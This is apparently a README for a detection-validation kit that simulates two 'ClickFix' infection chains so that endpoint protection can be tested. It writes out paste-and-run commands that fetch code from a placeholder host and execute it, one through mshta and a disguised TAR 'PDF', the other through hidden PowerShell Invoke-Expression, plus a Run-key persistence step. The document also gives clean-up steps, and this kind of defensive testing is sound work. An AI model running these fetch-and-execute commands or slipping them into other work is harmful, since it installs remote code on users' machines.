# clickfix_detecion_validator

These click-fix validations are a benign test of endpoint protection suites for detection of two infection methods observed in a production environment. 

## MSHTA

This method leverages a pasted command that downloads an HTA that then leverages cURL to download and extract a "PDF" that is actually a TAR archive containing the payload. The payload is then executed. If a file `C:\Users\<username>\Documents\928252966059280400\clickfix-sim-payload.txt` is created, the "infection" succeeded.

### Execution

cmd /v:on /c "set "u=%LOCALAPPDATA%\B.max" && curl -s -k -L -o "!u!" "https://<your_url.com>/B.max" && mshta "!u!" && del /f "!u!""

### Validation

```
%LOCALAPPDATA%\B.max
%USERPROFILE%\Documents\928252966059280400\clickfix-sim-payload.txt
%USERPROFILE%\Documents\928252966059280400\928252966059280400.pdf
%USERPROFILE%\Documents\928252966059280400\Syncovery.exe
```

### Clean-Up

```
Remove-Item -LiteralPath "$env:LOCALAPPDATA\B.max" -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath "$env:USERPROFILE\Documents\928252966059280400" -Force -Recurse -ErrorAction SilentlyContinue
```

## PWSH

This method leverages a PowerShell chain loader to install an application to the user's profile, then an HKCU registry entry to start the application on login. 

### Execution

powershell.exe -NoProfile -WindowStyle hidden -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://<your_url.com>/nexus-validation.txt' -UseBasicParsing).Content)"

### Validation

If the "infection" succeeded, you should find the following files:

```
%LOCALAPPDATA%\NexusConnector\NexusConnector.exe
%TEMP%\nexusconnector-loader-validation.log
%TEMP%\nexusconnector-validation.log
```

### Clean-Up

```
# Stop simulated payload if still running
Get-Process -Name NexusConnector -ErrorAction SilentlyContinue | Stop-Process -Force

# Remove HKCU Run persistence
Remove-ItemProperty `
  -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
  -Name 'NexusConnector' `
  -ErrorAction SilentlyContinue

# Remove installed simulated app
Remove-Item `
  -LiteralPath "$env:LOCALAPPDATA\NexusConnector" `
  -Recurse `
  -Force `
  -ErrorAction SilentlyContinue

# Remove validation logs
Remove-Item `
  -LiteralPath "$env:TEMP\nexusconnector-loader-validation.log","$env:TEMP\nexusconnector-validation.log" `
  -Force `
  -ErrorAction SilentlyContinue

# Remove any downloaded launcher script if you tested that method
Remove-Item `
  -LiteralPath "$env:TEMP\nexus-validation.ps1" `
  -Force `
  -ErrorAction SilentlyContinue

# Remove temp staging folders from this validation, identified by nexus_payload.zip
Get-ChildItem -Path $env:TEMP -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    if (Test-Path (Join-Path $_.FullName 'nexus_payload.zip')) {
        Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
    }
}
```
